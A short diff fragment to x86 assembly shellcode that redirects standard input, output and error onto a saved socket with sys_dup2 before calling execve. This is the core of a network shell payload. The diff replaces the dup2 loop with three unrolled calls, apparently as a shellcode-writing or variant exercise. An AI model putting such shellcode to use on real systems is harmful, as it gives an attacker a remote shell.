@@ -443,11 +443,29 @@ main:
 	xchg ebx,edx ;save sockfd
 
 ; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
-loop:
-	mov al, 0x3f ;syscall: sys_dup2 
+;loop:
+	;mov al, 0x3f ;syscall: sys_dup2 
+	;int 0x80     ;exec sys_dup2
+	;dec ecx	     ;decrement loop-counter
+	;jns loop     ;as long as SF is not set -> jmp to loop
+
+;NoLOOPS
+    mov al, 0x3f ;syscall: sys_dup2 
 	int 0x80     ;exec sys_dup2
 	dec ecx	     ;decrement loop-counter
-	jns loop     ;as long as SF is not set -> jmp to loop
+    mov al, 0x3f ;syscall: sys_dup2 
+	int 0x80     ;exec sys_dup2
+	dec ecx	     ;decrement loop-counter
+    mov al, 0x3f ;syscall: sys_dup2 
+	int 0x80     ;exec sys_dup2
+    dec ecx	 
+
+
+
+
+
+
+
 
 	;
 	; int execve(const char *filename, char *const argv[],char *const envp[]);
